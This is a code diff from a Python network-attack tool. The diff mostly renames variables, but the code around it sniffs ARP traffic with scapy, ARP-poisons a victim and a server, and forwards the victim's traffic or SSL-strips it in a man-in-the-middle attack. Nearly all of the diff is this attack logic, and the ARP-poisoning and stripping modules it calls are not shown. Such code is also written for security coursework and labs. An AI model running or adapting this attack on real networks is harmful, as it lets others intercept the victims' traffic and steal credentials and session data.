@@ -68,20 +68,20 @@ def main():
                     sslStrip = input("Use ssl stripping when possible: yes, no").strip().lower()
             
             if len(parts) == 2:
-                victim_ip = parts[0] if parts[0] != "none" else None
-                server_ip = parts[1] if parts[1] != "none" else None
-                print("len part", victim_ip, " server: ",server_ip)
+                victimIP = parts[0] if parts[0] != "none" else None
+                serverIP = parts[1] if parts[1] != "none" else None
+                print("len part", victimIP, " server: ",serverIP)
 
-                if (victim_ip is not None and server_ip is None):
+                if (victimIP is not None and serverIP is None):
                     pkt =  sc.sniff(filter="arp", store=0)
 
                     if pkt.haslayer(sc.ARP):
                         arp = pkt[sc.ARP]
-                        if arp.op == 1 and arp.psrc == victim_ip:
-                            serverMac, victimMac = ArpPoisen.arp_poisoning(victim_ip, arp.pdst, silent)
+                        if arp.op == 1 and arp.psrc == victimIP:
+                            serverMac, victimMac = ArpPoisen.arp_poisoning(victimIP, arp.pdst, silent)
                             
                 
-                elif (victim_ip is None and server_ip is None):
+                elif (victimIP is None and serverIP is None):
                     pkt =  sc.sniff(filter="arp", store=0)
                     if pkt.haslayer(sc.ARP):
                         arp = pkt[sc.ARP]
@@ -89,11 +89,11 @@ def main():
                             serverMac, victimMac = ArpPoisen.arp_poisoning(arp.psrc, arp.pdst, silent)
 
                 else:
-                    print("else option", victim_ip, server_ip, silent)
+                    print("else option", victimIP, serverIP, silent)
                     serverMac, victimMac = ArpPoisen.arp_poisoning(victimIP, serverIP, silent)
 
                 if goal == "ownserver":
-                    sslStripping.forward(victim_ip, victimMac, ownServerIp, ownServerMac, attackerIP, attackerMac)
+                    sslStripping.forward(victimIP, victimMac, ownServerIp, ownServerMac, attackerIP, attackerMac)
                     return
                     
                 elif goal == "mitm":
@@ -104,9 +104,9 @@ def main():
                             if (not ArpPoisen.three_way_handshake(pkt, victimMac, victimIP, attackerMac, attackerIP, serverMac, serverIP)):
                                 continue
                             if (sslStrip == "yes"):
-                                sslStripping.stripping(victim_ip, victimMac, server_ip, serverMac, attackerIP, attackerMac)
+                                sslStripping.stripping(victimIP, victimMac, serverIP, serverMac, attackerIP, attackerMac)
                             else:
-                                sslStripping.forward(victim_ip, victimMac, server_ip, serverMac, attackerIP, attackerMac)
+                                sslStripping.forward(victimIP, victimMac, serverIP, serverMac, attackerIP, attackerMac)
             else:
                 print("Invalid input format. Please enter in the form: 'victim ip, server ip'")
         elif ipt == "quit":
